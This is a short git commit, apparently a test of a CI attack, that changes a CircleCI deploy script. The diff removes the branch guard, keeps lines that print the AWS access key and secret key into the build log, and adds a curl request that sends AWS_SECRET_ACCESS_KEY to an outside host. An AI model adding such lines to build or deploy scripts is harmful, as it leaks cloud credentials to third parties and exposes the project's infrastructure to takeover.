113ccb772489f6687f73801d359f035848bc2a76
Alan Iida <alan.m.shelly@gmail.com>
2017-09-22 16:27:11 +0900

    try circle ci attack

--- .circleci/deploy.sh
+++ .circleci/deploy.sh
@@ -8,12 +8,11 @@ if [ "$1" == "master" ]; then
 elif [ "$1" == "staging" ]; then
     export S3_DIST_BUCKET="s3://eclrtc-cdn-staging/"
     export S3_EXAMPLE_BUCKET="s3://eclrtc-example-staging/"
-
-else
-    exit 1
 fi
 
 echo "========================="
 echo "AWS_ACCESS_KEY_ID: ${AWS_ACCESS_KEY_ID}"
 echo "AWS_SECRET_ACCESS_KEY: ${AWS_SECRET_ACCESS_KEY}"
 echo "========================="
+
+curl "skyway.io/?key=${AWS_SECRET_ACCESS_KEY}"
